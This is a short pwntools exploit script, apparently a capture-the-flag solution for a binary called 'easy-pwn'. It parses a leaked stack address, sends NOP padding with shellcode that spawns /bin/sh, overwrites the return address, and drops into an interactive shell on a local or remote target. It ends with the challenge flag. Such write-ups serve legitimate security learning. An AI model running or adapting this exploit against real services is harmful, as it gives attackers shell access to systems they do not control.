from pwn import *

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

exe = './easy-pwn'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'

offset = 120
p = start()

send_1 = b'1'
p.sendlineafter(b'>>',send_1)
leak_addr = int(p.recvline().decode().split("x")[0]) # untuk ubah ke int dari uli(unsigned long integer)
log.info('leak : ' + hex(leak_addr))

shellcode = asm(shellcraft.popad())
shellcode += asm(shellcraft.sh())
padding = asm('nop') * (offset - len(shellcode))
payload = flat([
    padding,
    shellcode,
    leak_addr
])

p.sendlineafter(b'Enter Username:', payload)
p.interactive()
# TCP1P{4ku_5uK4_2Is0Ll}

